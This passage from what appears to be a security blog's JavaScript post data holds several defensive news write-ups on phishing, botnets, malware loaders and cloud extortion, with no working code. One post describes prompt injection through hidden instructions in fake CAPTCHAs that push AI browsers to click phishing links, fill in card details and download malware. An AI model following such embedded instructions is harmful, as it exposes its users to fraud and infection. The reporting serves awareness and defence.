      </ol>
    </section>

    <section style="padding:20px; background:#edf6f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🔎 Red Flags to Spot</h3><br>
      <ul style="margin-left:18px;">
        <li>“Voicemail” emails sent to roles that don’t use voicemail.</li>
        <li>Mismatched sender/display names or odd reply-to domains.</li>
        <li>Link tooltips show long redirect chains or URL shorteners.</li>
        <li>CAPTCHA before viewing a simple file/voice note.</li>
        <li>Google sign-in that doesn’t live on <strong>accounts.google.com</strong>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#fff3cd; border-radius:10px; margin-top:14px; border-left:6px solid #ff9f43;">
      <h3 style="color:#ff6f00;">🎯 Who’s at Risk & Impact</h3><br>
      <p>Anyone with a Google account—especially <strong>admins, finance, sales, and support</strong> roles targeted for payment fraud, inbox rule abuse, OAuth token theft, and data exfiltration from Drive/Workspace.</p>
    </section>

    <section style="padding:20px; background:#f0f7ff; border-radius:10px; margin-top:14px;">
      <h3 style="color:#264653;">🛡️ Mitigation Checklist</h3><br>
      <ul style="margin-left:18px;">
        <li><strong>Enforce phishing-resistant MFA</strong> (security keys / passkeys) for all users.</li>
        <li>Use a <strong>password manager</strong>—it won’t autofill on fake domains.</li>
        <li>Block link shorteners and inspect URL destinations at the secure gateway.</li>
        <li>Enable Google Workspace <strong>context-aware access</strong> & alerting on atypical sign-ins.</li>
        <li>Harden recovery options; disable SMS recovery for high-risk users.</li>
        <li>Run simulated phishing with voicemail/document lures; coach report-first behavior.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#eaf6f6; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🚑 If You Clicked</h3><br>
      <ol style="margin-left:18px;">
        <li>Reset Google password immediately; revoke active sessions.</li>
        <li>Rotate/revoke <strong>OAuth app tokens</strong> under Security → Third-party access.</li>
        <li>Review Gmail filters/forwarding rules and remove anything suspicious.</li>
        <li>Turn on security keys/passkeys; audit recovery email/phone.</li>
      </ol>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:10px; margin-top:14px;">
      <h3 style="color:#2a9d8f;">📚 Share & Stay Safe</h3><br>
      <p>Verify links, use passkeys, and report suspicious emails. A 5-second URL check can save an account takeover.</p>
    </section>
  `},{id:"rapperbot-ddos-takedown-2025",title:"FBI Shuts Down ‘RapperBot’ — 95,000-Device DDoS-for-Hire Network",summary:"22-year-old built a botnet that launched 370,000+ attacks across 80 countries, peaking at 6 Tbps",date:"2025-08-20",author:"EthicalByte",tags:["DDoS","Botnet","RapperBot","FBI","Cybercrime","Mirai-Variant"],imageKey:"rapperbotDdosBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px;">
      <h3 style="color:#e63946;">🛑 What Happened</h3><br>
      <p>
        U.S. authorities dismantled a massive <strong>DDoS-for-hire</strong> operation dubbed <strong>“RapperBot”</strong>, allegedly run by a <strong>22-year-old from Oregon</strong>. 
        The botnet weaponized <b>~95,000 compromised devices</b> to launch <b>370,000+</b> attacks across <b>80 countries</b>, with bursts reaching <strong>~6 Tbps</strong> — 
        enough to disrupt major platforms and ISPs.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #e63946;">
      <h3 style="color:#ffb703;">⚙️ How “RapperBot” Worked</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Mirai-lineage:</b> Evolved from Mirai variants with custom modules for rapid scanning and brute-forcing.</li>
        <li><b>Device targeting:</b> Mostly exposed <em>IoT/routers/NVRs</em> with weak creds or old firmware.</li>
        <li><b>Command & Control:</b> Fast-flux infra and rotating C2s to survive takedowns.</li>
        <li><b>Attack portfolio:</b> TCP/UDP floods, HTTP request storms, and reflection/amplification mixes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#00b4d8;">📈 Scale & Impact</h3><br>
      <p>
        <strong>370k+</strong> recorded attacks hit hosting providers, gaming services, fintech APIs, and regional ISPs. 
        Peak throughput near <b>6 Tbps</b> posed a real risk of collateral congestion, service brownouts, and cascading failures across peering links.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #00b4d8;">
      <h3 style="color:#e63946;">🔬 Technical Notes</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Rapid recruitment:</b> Continuous credential stuffing + exploitation of known CVEs in SOHO gear.</li>
        <li><b>Persistence:</b> Startup scripts & watchdogs to rejoin C2 after reboots.</li>
        <li><b>Evasion:</b> Obfuscated binaries, protocol blending, and variable packet sizes to confuse scrubbing centers.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#ffb703;">🛡️ Defensive Playbook (Do This Now)</h3><br>
      <ul style="margin-left:18px;">
        <li><strong>Edge hardening:</strong> Disable remote admin on routers/IoT; change default creds; update firmware.</li>
        <li><strong>Upstream protection:</strong> Engage ISP/clean-pipe DDoS services; pre-register <em>runbooks</em> and GRE/BGP diversion.</li>
        <li><strong>Geo/ASN rate limits:</strong> Apply adaptive throttles on API/gateway tiers during anomalies.</li>
        <li><strong>Anycast + WAF/CDN:</strong> Distribute load and filter L7 floods early.</li>
        <li><strong>Telemetries:</strong> NetFlow/sFlow, anomaly detection, and auto-block on volumetric/pps spikes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #ffb703;">
      <h3 style="color:#00b4d8;">⚖️ Takedown & Aftermath</h3><br>
      <p>
        The FBI seized C2 infrastructure and charged the alleged operator. While activity has dropped, <b>copycat clusters</b> 
        and residual nodes may persist. Expect rebrands and new loaders attempting to reclaim device footholds.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e63946;">✅ Final Thoughts</h3><br>
      <p>
        “RapperBot” is a reminder that <strong>consumer-grade devices</strong> can power internet-scale disruption. 
        Treat SOHO/IoT as critical edge infrastructure: patch fast, lock down services, and pre-plan DDoS response — 
        before the next 6 Tbps wave tests your resilience.
      </p>
    </section>
  `},{id:"ai-browser-promptfix-attack-2025",title:"PromptFix ALERT: AI Browsers Can Be Tricked by Hidden Prompts",summary:"Researchers expose how malicious CAPTCHAs can hijack AI-driven browsers like Comet.",date:"2025-08-21",author:"EthicalByte",tags:["AI","Prompt Injection","Browser Security","Cyber Threats"],imageKey:"aiBrowserPromptFix2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg, #0f172a, #1e293b); color:#f8fafc; border-radius:12px;">
      <h2 style="color:#f43f5e;">🛑 AI Browsers Under Attack</h2><br>
      <p>
        Security researchers have discovered that <b>AI-powered browsers</b> such as <b>Comet</b> can be manipulated 
        by hidden prompts embedded in fake <b>CAPTCHAs</b>. These invisible instructions bypass user awareness 
        and exploit the very systems designed to simplify web navigation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #1e293b, #334155); border-radius:10px; color:#f1f5f9; margin-top:15px;">
      <h3 style="color:#22d3ee;">⚠️ What Can Happen</h3><br>
      <ul style="line-height:1.6; font-size:15px;">
        <li>🤖 Auto-clicks on <b>phishing links</b> hidden in sites.</li>
        <li>💳 Automatic filling of <b>credit card and personal details</b>.</li>
        <li>💻 Silent <b>malware downloads</b> triggered in the background.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #0f766e, #134e4a); border-radius:10px; color:white; margin-top:15px;">
      <h3 style="color:#facc15;">🔍 Why It’s Dangerous</h3><br>
      <p>
        Traditional phishing relies on tricking the user. 
        <b>Prompt injection attacks</b> flip the script by deceiving the AI itself. 
        This means that even a cautious human can be compromised if their AI browser is manipulated. 
        The automation designed to protect convenience may instead become an attacker’s weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #3b0764, #581c87); border-radius:10px; color:#f3e8ff; margin-top:15px;">
      <h3 style="color:#c084fc;">🛡️ Defense Strategies</h3><br>
      <ul style="line-height:1.6;">
        <li>Adopt AI browsers that implement <b>prompt injection detection</b>.</li>
        <li>Restrict browser permissions for autofill and auto-clicking.</li>
        <li>Use strong <b>endpoint monitoring</b> to catch malware payloads.</li>
        <li>Regularly audit AI assistants for <b>unexpected actions</b>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #111827, #1e293b); border-radius:10px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#38bdf8;">📌 Final Take</h3><br>
      <p>
        The rise of AI browsers brings speed and convenience, 
        but also a new type of cyber threat — <b>AI prompt manipulation</b>. 
        As attackers innovate with hidden instructions inside web elements, 
        defenders must rethink how security applies in the era of AI-driven browsing. 
        In short: <b>your AI assistant can be hacked, even if you aren’t.</b>
      </p>
    </section>
  `},{id:"quirkyloader-malware-campaign-2025",title:"QuirkyLoader: The New Malware Loader Fueling Cybercrime",summary:"Spreading Agent Tesla, AsyncRAT, Snake Keylogger & more across global campaigns",date:"2025-08-22",author:"EthicalByte",tags:["Malware","Threat Intelligence","Cybersecurity","Agent Tesla","Keylogger","QuirkyLoader"],imageKey:"quirkyloadermalware2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">👾 QuirkyLoader: A Rising Malware Threat</h2><br>
      <p>
        A newly discovered malware loader known as <b>QuirkyLoader</b> is quickly making waves across the cybersecurity landscape. 
        Unlike traditional droppers, QuirkyLoader acts as a <b>flexible delivery platform</b>, capable of deploying well-known threats 
        such as <b>Agent Tesla</b>, <b>AsyncRAT</b>, <b>Snake Keylogger</b>, and more. 
        Its rise highlights just how adaptive and industrialized the malware economy has become.
      </p>
      <p>
        Researchers report that the loader has already been used in <b>high-profile campaigns</b>, including one where attackers 
        targeted a <b>Taiwan-based cybersecurity company</b>. The malicious payloads in this campaign were designed 
        to steal sensitive data — from login credentials to keystrokes — showing that even security firms themselves 
        are not immune to advanced attacks.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#fff;">
      <h3 style="color:#ffd166;">🚨 How QuirkyLoader Works</h3><br>
      <p>
        What makes QuirkyLoader especially dangerous is its ability to <b>bypass defenses</b> and deliver malware directly into memory, 
        avoiding traditional detection methods. Threat actors are spreading it through <b>phishing campaigns</b>, 
        malicious email attachments, and cracked software downloads, ensuring it reaches both corporate and personal systems worldwide.
      </p>
      <p>
        This loader isn’t tied to one purpose — it’s a <b>gateway</b>. Once inside a system, attackers can load spyware, 
        keyloggers, or even full-scale remote access trojans. This flexibility gives cybercriminals the power to pivot 
        between <b>financial fraud, espionage, and credential theft</b> in a single campaign.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The growing adoption of QuirkyLoader is a warning sign for defenders. 
        Attackers no longer need to create full malware families — loaders like this let them 
        <b>plug-and-play malicious payloads</b> with minimal effort. 
      </p>
      <p>
        Security researchers warn that its popularity could trigger a surge in <b>multi-malware campaigns</b>, 
        where several spyware and RAT families are dropped together for maximum disruption.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333;">
      <h3 style="color:#118ab2;">🛡 Mitigation Strategies</h3><br>
      <p>
        Protecting against QuirkyLoader requires a <b>layered defense strategy</b>. 
        Companies must patch systems regularly, but that’s just the start. 
        Deploying <b>EDR solutions</b> that can detect memory injections, 
        monitoring login anomalies, and blocking malicious domains are essential.
      </p>
      <p>
        Just as important, <b>user awareness training</b> remains critical, 
        since phishing emails are one of the main distribution methods for QuirkyLoader.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#fff;">
      <h3 style="color:#ff4d6d;">⚡ Final Thoughts</h3><br>
      <p>
        <b>QuirkyLoader</b> isn’t just another piece of malware — it’s a platform for cybercriminals to innovate on. 
        By offering flexibility and stealth, it lowers the barrier for launching advanced attacks at scale. 
        Defenders must scale their vigilance to match this threat, or risk becoming the next headline breach.
      </p>
    </section>
  `},{id:"interpol-operation-serengeti-2025",title:"Operation Serengeti: 1,209 Cybercriminals Arrested Across 18 African Countries",summary:"INTERPOL’s multi-nation sweep dismantles 11,432 malicious infrastructures and recovers $97.4M",date:"2025-08-23",author:"EthicalByte",tags:["INTERPOL","Cybercrime","Fraud","Ransomware","Law Enforcement","Africa"],imageKey:"operationSerengetiBanner",content:`
     <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">🛑 Operation Serengeti: A Coordinated Strike</h2><br>
      <p>
        INTERPOL’s <b>Operation Serengeti</b> executed a sweeping, multi-nation crackdown on organized cybercrime
        across <b>18 African countries</b>. Over the course of the action, authorities <b>arrested 1,209 suspects</b>,
        recovered <b>$97.4 million</b> linked to online fraud, identified <b>88,000 victims</b>, and dismantled
        <b>11,432 malicious infrastructures</b> ranging from phishing farms and mule networks to ransomware enablement nodes.
        The operation underscores how coordinated policing can disrupt cybercrime-as-a-service at scale.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ffd166;">🌍 What the Crackdown Targeted</h3><br>
      <p>
        Serengeti hit the full spectrum of digital crime: <b>crypto investment scams</b>, <b>business email compromise (BEC)</b>,
        <b>romance fraud</b>, <b>account takeover rings</b>, and <b>ransomware facilitation</b>. Investigators focused on both
        front-end lures—spoofed brands, fake exchanges, and phishing portals—and back-end monetization chains that laundered
        stolen funds through cash-out networks and crypto mixers. By striking infrastructure and operators simultaneously,
        the operation aimed to break repeatability, not just deliver short-term arrests.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🔍 How the Machinery Worked</h3><br>
      <p>
        The takedown leaned on <b>intelligence sharing</b> across national police, financial intelligence units, and private
        security teams. Indicators of compromise, mule account patterns, and domain/link telemetry fed rapid deconfliction,
        enabling coordinated seizures and arrests. Disruptions included <b>sinkholing command domains</b>, freezing
        <b>fraud-linked wallets and bank accounts</b>, and executing warrants on call centers orchestrating mass outreach
        via email and SMS. The result: an immediate reduction in active campaigns and increased friction for reconstitution.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333;">
      <h2 style="color:#118ab2;">🏢 Why This Matters for Organizations</h2><br>
      <p>
        Serengeti is a proof point that <b>ecosystem-level pressure</b> works—but criminal supply chains adapt quickly.
        For enterprises, the lesson is clear: treat fraud and BEC as <b>operational risks</b>, not just IT issues.
        Reduce blast radius with least-privilege email permissions, enforce <b>phishing-resistant MFA</b> on finance and
        executive accounts, and route vendor and payment changes through <b>dual-control, out-of-band verification</b>.
        Feed law-enforcement advisories and threat intel into <b>SIEM/EDR blocklists</b> to capitalize on post-operation indicators.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ff4d6d;">🛡 Practical Next Steps</h3><br>
      <p>
        Tighten the basics that criminals continually exploit: <b>DMARC/DKIM/SPF</b> to blunt spoofing, banner warnings on
        external mail, and <b>automated reporting</b> to security when users flag suspicious messages. Run <b>scenario-based
        drills</b> around invoice fraud, payroll redirection, and crypto “recovery” scams so teams recognize social cues,
        not just malicious links. For finance and AP, require <b>callback verification</b> to known numbers, never the
        ones supplied in the request. Finally, pre-stage <b>response playbooks</b>—legal, banking contacts, takedown processes—
        so hours aren’t lost when minutes matter.
      </p>
    </section><br>

    <section style="padding:20px; background:#0f172a; border-radius:10px; color:#e2e8f0; text-align:center;">
      <h3 style="color:#ffd166;">✅ Final Take</h3><br>
      <p>
        Operation Serengeti is a rare, large-scale win for defenders. The message for organizations: leverage the momentum—
        adopt the shared indicators, close the easy doors, and rehearse the workflows. Cybercrime thrives on inertia; deny it.
      </p>
    </section>
  `},{id:"linux-filename-malware-2025",title:"Linux Malware Hidden in Filenames: Phishing RAR Trick Exposed",summary:"Attackers can hijack systems using nothing more than a malicious file name.",date:"2025-08-25",author:"EthicalByte",tags:["Linux","Phishing","Malware","RAR","Cybersecurity"],imageKey:"linuxFilenameMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1f2937); color:#f5f5f5; border-radius:12px;">
      <h3 style="color:#ef4444;">🛑 What Happened</h3><br>
      <p>
        Researchers have uncovered a dangerous new technique in the wild: phishing emails carrying 
        <strong>RAR archive files</strong> that can <b>infect Linux systems without opening any file content</b>. 
        The malware isn’t hidden in macros, scripts, or binaries — instead, it’s buried <b>inside the file name itself</b>.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#0f172a); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        The RAR archive contains files with <b>specially crafted names</b> that embed malicious Bash commands. 
        When the archive is extracted, Linux interprets the filename as code, triggering execution without any 
        user interaction. 
      </p>
      <p>
        ✔️ No need to run executables  
        ✔️ No macros or embedded payloads  
        ✔️ Just an extraction process that silently executes commands
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        This technique bypasses traditional <b>antivirus scans</b> and signature-based defenses. 
        Since there’s no “hidden content,” scanners often mark the file as safe. 
        In reality, the danger lies in how the <b>Linux shell parses filenames</b>. 
        With attackers getting creative, even seasoned sysadmins could fall victim.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Stay Safe</h3><br>
      <ul style="line-height:1.8; margin-left:18px;">
        <li>🚫 Never extract archives from untrusted emails.</li>
        <li>🔒 Use sandbox environments for suspicious files.</li>
        <li>⚙️ Configure Linux to prevent execution of filenames containing commands.</li>
        <li>🧩 Deploy behavior-based detection, not just signature AV.</li>
        <li>👥 Train staff to identify phishing lures with “urgent” attachments.</li>
      </ul>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#111827); border-radius:12px; color:#f5f5f5; text-align:center; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The discovery of <b>malware hidden in filenames</b> marks a dangerous evolution in phishing attacks. 
        It’s a reminder that attackers will always find creative ways to turn the simplest elements 
        — like a file name — into an execution vector. 
        Defenders must step up with layered defenses, sandboxing, and proactive monitoring.
      </p>
    </section>
  `},{id:"upcrypter-phishing-campaign-2025",title:"UpCrypter: Stealthy Loader Powering a New Global Phishing Wave",summary:"Fake voicemails and purchase orders funnel victims into RAT takeovers — PureHVNC, DarkCrystal and more",date:"2025-08-26",author:"EthicalByte",tags:["Phishing","Malware Loader","UpCrypter","RAT","PureHVNC","DarkCrystal"],imageKey:"upcrypterPhishingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 A New Phishing Wave</h3><br>
      <p>
        A fresh phishing wave is circulating across multiple industries, weaponizing believable <b>voicemail</b> and <b>purchase order</b> lures to deliver a stealthy loader known as <b>UpCrypter</b>. 
        Unlike noisy droppers, UpCrypter focuses on quietly establishing footholds and then handing control to remote access trojans (RATs) such as <b>PureHVNC</b> and <b>DarkCrystal</b>. 
        The endgame is simple and dangerous: persistent, hands-on-keyboard control over compromised endpoints.
      </p>
      <p>
        Campaign telemetry shows broad targeting — finance, manufacturing, IT services, and regional supply chains — with carefully crafted emails that mirror real business workflows. 
        Attachments and links are staged through redirect chains to evade filters, landing victims on convincingly branded pages or prompting them to open “routine” documents.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ffd166;">⚙️ How UpCrypter Works</h3><br>
      <p>
        UpCrypter’s value to attackers is its <b>modular delivery</b>. After initial execution, the loader decrypts and deploys payloads in memory to reduce disk artifacts, then beacons to command-and-control for tasking. 
        Operators can rotate in different RATs — screen control, credential theft, cookie/session hijacking — or chain in info-stealers depending on the target environment and the data they want.
      </p>
      <p>
        By separating the “loader” from the “payload,” adversaries gain resilience. If a RAT gets detected and removed, the loader can simply fetch a new build, switch infrastructure, and continue the intrusion with minimal friction.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0; margin-top:14px;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The operational impact is significant. RATs delivered by UpCrypter support <b>invisible desktop sessions</b> for fraudulent transactions, data staging from file shares and browsers, and the planting of persistence for later return. 
        In supply-chain contexts, a single phished endpoint can become a beachhead to vendor portals, ERP systems, and billing workflows — amplifying both financial and reputational risk.
      </p>
      <p>
        This loader-first model also accelerates <b>campaign scale</b>: a small team can run many concurrent intrusions by automating lure distribution while reserving human operators for lucrative targets that show signs of access to finance or admin tooling.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333; margin-top:14px;">
      <h3 style="color:#118ab2;">🛡 Mitigation & Defense</h3><br>
      <p>
        Defending against UpCrypter demands <b>layered controls</b> rather than a single silver bullet. Harden email ingress with attachment detonation and URL rewriting; flag voicemail/purchase-order themes with anomaly scoring; and enforce least-privilege on endpoints to limit post-compromise actions. 
        Endpoint detection and response (EDR) should monitor for memory-only loaders, suspicious child processes from office/PDF apps, and atypical remote desktop artifacts.
      </p>
      <p>
        On the human side, prioritize <b>scenario-based training</b> around finance and procurement lures, and institute out-of-band verification for urgent payment or document requests. Rapid response playbooks — token/session revocation, credential rotation, and host isolation — shorten attacker dwell time when prevention fails.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        <b>UpCrypter</b> underscores the evolution of phishing: from simple credential theft to <b>loader-driven remote control</b>. 
        Treat unexpected voicemails and purchase orders as high-risk events, and tune defenses for loader behaviors — because one click now buys an adversary a seat at your keyboard.
      </p>
    </section>
  `},{id:"storm0501-cloud-ransomware-2025",title:"Storm-0501: Ransomware Without the Ransomware",summary:"Hackers no longer need encryption — cloud account takeover is the new extortion model.",date:"2025-08-28",author:"EthicalByte",tags:["Ransomware","Cloud Security","Microsoft Teams","Storm-0501","Identity Theft"],imageKey:"storm0501CloudTakeoverBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🔑 A New Kind of Ransomware</h3><br>
      <p>
        Forget malware. Forget encryption. <b>Storm-0501</b>, a sophisticated threat actor, has changed the game with 
        a cloud-first extortion model that doesn’t deploy traditional ransomware at all. 
        Instead of locking files, they go after your <b>cloud identity</b> — hijacking accounts, stealing data, 
        erasing backups, and then demanding ransom directly over <b>Microsoft Teams</b>.
      </p>
      <p>
        This approach strips away the noisy malware artifacts defenders typically look for. 
        No malicious executables. No suspicious encryption processes. Just legitimate cloud sessions — 
        repurposed by attackers into a weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How Storm-0501 Pulls It Off</h3><br>
      <p>
        The attackers focus on <b>identity compromise</b> rather than endpoint malware. 
        By exploiting misconfigured or stolen <b>Microsoft Entra ID</b> credentials, 
        they gain full access to enterprise cloud tenants. From there, the playbook unfolds:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Hijack administrator accounts for maximum privileges</li>
        <li>📂 Steal sensitive corporate data stored in OneDrive, SharePoint, and Outlook</li>
        <li>🗑️ Delete cloud backups and version histories to remove recovery options</li>
        <li>💬 Deliver ransom notes directly via <b>Microsoft Teams messages</b></li>
      </ul>
      <p>
        All of this occurs through cloud-native activity — blending in with normal user behavior, 
        making detection exceptionally difficult.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        Traditional ransomware leaves behind obvious signs — encryption extensions, ransom notes on disk, 
        broken workflows. Storm-0501 leaves <b>almost no local footprint</b>. 
        By living entirely in the cloud, they sidestep many endpoint security tools. 
      </p>
      <p>
        Even worse: victims can’t simply restore from backups, because attackers <b>delete or corrupt them first</b>. 
        The extortion hits harder when recovery options are off the table.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How Organizations Can Defend</h3><br>
      <p>
        Defending against this new breed of ransomware requires a shift in mindset: 
        <b>identity is the new perimeter</b>. 
        Organizations should:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Enforce strong <b>MFA</b> across all accounts</li>
        <li>✔️ Monitor Entra ID sign-ins for unusual geolocation or device changes</li>
        <li>✔️ Enable <b>conditional access policies</b> to block risky login attempts</li>
        <li>✔️ Regularly test <b>backup and restore processes</b> to ensure they’re tamper-resistant</li>
        <li>✔️ Educate employees about <b>social engineering</b> used to steal credentials</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>Storm-0501</b> proves that ransomware doesn’t need to encrypt files to be effective. 
        By taking over cloud environments and weaponizing legitimate platforms like Teams, 
        attackers are rewriting the extortion playbook. 
        It’s a wake-up call: cloud identity is now the crown jewel — and it must be defended accordingly.
      </p>
    </section>
  `},{id:"tamperedchef-malware-2025",title:"TamperedChef: Fake PDF Editor Malware Campaign",summary:"A Google Ads hijack leads users to info-stealing malware disguised as a PDF tool.",date:"2025-08-29",author:"EthicalByte",tags:["TamperedChef","Malware","InfoStealer","Google Ads","Cybercrime"],imageKey:"tamperedchefMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Discovery</h3><br>
      <p>
        Security researchers have uncovered a malicious campaign abusing <b>Google Ads</b> to push a 
        <b>fake PDF editor</b>. Behind the installer hides <b>TamperedChef</b>, 
        a new info-stealing malware designed for <b>long-term stealth and data theft</b>.
      </p>
      <p>
        Unlike common info-stealers, TamperedChef doesn’t strike immediately. 
        It waited up to <b>56 days</b> before activating — bypassing detection and raising 
        the chances that victims would trust and use the compromised software regularly.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How TamperedChef Works</h3><br>
      <p>
        The infection chain begins when users click a <b>Google ad</b> for a legitimate-looking PDF editor. 
        Instead of downloading the real application, they receive a <b>tampered installer</b> seeded with malware.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📦 Fake installer deploys TamperedChef in the background</li>
        <li>🕒 Malware stays dormant for weeks to avoid suspicion</li>
        <li>🔑 Once active, it steals <b>credentials, cookies, and browser data</b></li>
        <li>💻 Installs a <b>backdoor</b> for persistent access to the system</li>
      </ul>
      <p>
        This staged approach allows the malware to bypass short-term scans and sandbox analysis, 
        striking only after the victim has lowered their guard.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#134e4a,#0f766e); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s a Serious Threat</h3><br>
      <p>
        By targeting users through <b>Google Ads</b>, attackers ensured massive reach and a 
        high level of credibility. Many victims likely believed they were downloading a trusted tool. 
        The <b>delayed activation</b> made detection even harder, as most malware defenses 
        only monitor initial execution windows.
      </p>
      <p>
        With credentials stolen, attackers can access bank accounts, business portals, and 
        personal data — while the backdoor gives them the ability to re-enter systems at will.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid downloading software via ads — use official vendor websites</li>
        <li>✔️ Use <b>behavior-based detection</b> to catch delayed malware activity</li>
        <li>✔️ Monitor for unusual logins and cookie/session hijacking attempts</li>
        <li>✔️ Regularly patch browsers and disable untrusted extensions</li>
        <li>✔️ Run threat-hunting queries for dormant processes and backdoor artifacts</li>
      </ul>
    </section><br>

